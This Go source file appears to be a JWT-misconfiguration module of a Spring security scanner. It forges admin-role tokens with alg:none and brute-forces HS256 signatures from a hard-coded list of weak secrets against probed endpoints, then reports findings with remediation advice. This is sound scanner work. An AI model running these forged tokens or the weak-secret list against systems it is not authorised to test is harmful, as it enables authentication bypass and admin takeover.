package web

// JWT attacks: alg:none bypass, weak secret brute force
// Tests common Spring Security JWT misconfigurations

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
)

func init() { vulns.RegisterRemote(&JWTAttacks{}) }

type JWTAttacks struct{}

func (m *JWTAttacks) ID() string               { return "jwt-attacks" }
func (m *JWTAttacks) Name() string             { return "JWT Misconfiguration Attacks" }
func (m *JWTAttacks) CVSS() float64            { return 8.1 }
func (m *JWTAttacks) Severity() models.Severity { return models.SeverityHigh }
func (m *JWTAttacks) Tags() []string { return []string{"auth-bypass", "jwt", "spring-security", "token"} }
func (m *JWTAttacks) Requirements() vulns.ModuleRequirements { return vulns.ModuleRequirements{} }
func (m *JWTAttacks) Description() string {
	return "Tests JWT security: alg:none bypass (unsigned token accepted) and weak HMAC secret brute force."
}

var jwtProbeEndpoints = []string{
	"api/user", "api/users/me", "api/profile", "user/info",
	"api/v1/user", "api/v1/me", "me", "profile",
}

var weakSecrets = []string{
	"secret", "password", "123456", "spring", "jwt", "key",
	"secretkey", "mySecretKey", "springboot", "default",
	"admin", "test", "token", "jwtSecret", "spring-security",
	"application", "app-secret", "jwt-secret",
}

func (m *JWTAttacks) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	var findings []*models.Finding

	var authEndpoint string
	for _, ep := range jwtProbeEndpoints {
		resp, err := client.Get(ctx, target.BaseURL+"/"+ep, nil)
		if err != nil {
			continue
		}
		if resp.StatusCode == 401 || resp.StatusCode == 403 {
			authEndpoint = ep
			break
		}
	}
	if authEndpoint == "" {
		return nil, nil
	}

	if f := m.tryAlgNone(ctx, target, client, authEndpoint); f != nil {
		findings = append(findings, f)
	}
	if f := m.tryWeakSecret(ctx, target, client, authEndpoint); f != nil {
		findings = append(findings, f)
	}
	return findings, nil
}

func (m *JWTAttacks) tryAlgNone(ctx context.Context, target *models.Target, client *httpclient.Client, endpoint string) *models.Finding {
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"ADMIN","iat":1700000000,"exp":9999999999}`))
	token := header + "." + payload + "."

	resp, err := client.Get(ctx, target.BaseURL+"/"+endpoint,
		map[string]string{"Authorization": "Bearer " + token})
	if err != nil || resp.StatusCode == 401 || resp.StatusCode == 403 {
		return nil
	}

	return &models.Finding{
		ID:          fmt.Sprintf("%s-algnone-%d", m.ID(), time.Now().UnixNano()),
		Type:        models.FindingTypeVuln,
		Severity:    m.Severity(),
		CVSS:        m.CVSS(),
		Title:       "JWT Algorithm None Bypass — Unsigned Token Accepted",
		Description: "The application accepts JWT tokens with alg:none, allowing auth bypass with forged payloads.",
		URL:         target.BaseURL,
		Endpoint:    "/" + endpoint,
		Evidence:    fmt.Sprintf("HTTP %d returned with unsigned JWT (alg:none). Auth bypassed.", resp.StatusCode),
		Payload:     "Authorization: Bearer " + token,
		Remediation: "Explicitly validate JWT algorithm. Reject alg:none tokens.",
		References:  []string{"https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"},
		Tags:        m.Tags(),
		Timestamp:   time.Now(),
		ModuleID:    m.ID(),
	}
}

func (m *JWTAttacks) tryWeakSecret(ctx context.Context, target *models.Target, client *httpclient.Client, endpoint string) *models.Finding {
	for _, secret := range weakSecrets {
		token := buildHS256JWT(secret)
		resp, err := client.Get(ctx, target.BaseURL+"/"+endpoint,
			map[string]string{"Authorization": "Bearer " + token})
		if err != nil || resp.StatusCode == 401 || resp.StatusCode == 403 {
			continue
		}
		return &models.Finding{
			ID:          fmt.Sprintf("%s-weaksecret-%d", m.ID(), time.Now().UnixNano()),
			Type:        models.FindingTypeVuln,
			Severity:    models.SeverityCritical,
			CVSS:        9.1,
			Title:       fmt.Sprintf("JWT Weak HMAC Secret Discovered: '%s'", secret),
			Description: "JWT tokens can be forged using the discovered weak secret.",
			URL:         target.BaseURL,
			Endpoint:    "/" + endpoint,
			Evidence:    fmt.Sprintf("HTTP %d with token signed by weak secret '%s'.", resp.StatusCode, secret),
			Payload:     "Authorization: Bearer " + token,
			Remediation: "Use a strong random secret (min 256-bit). Consider RS256/ES256.",
			References:  []string{"https://owasp.org/www-project-api-security/"},
			Tags:        m.Tags(),
			Timestamp:   time.Now(),
			ModuleID:    m.ID(),
		}
	}
	return nil
}

func (m *JWTAttacks) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}

func buildHS256JWT(secret string) string {
	headerB64 := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	payloadB64 := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"ADMIN","iat":1700000000,"exp":9999999999}`))
	unsigned := headerB64 + "." + payloadB64

	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(unsigned))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return unsigned + "." + sig
}
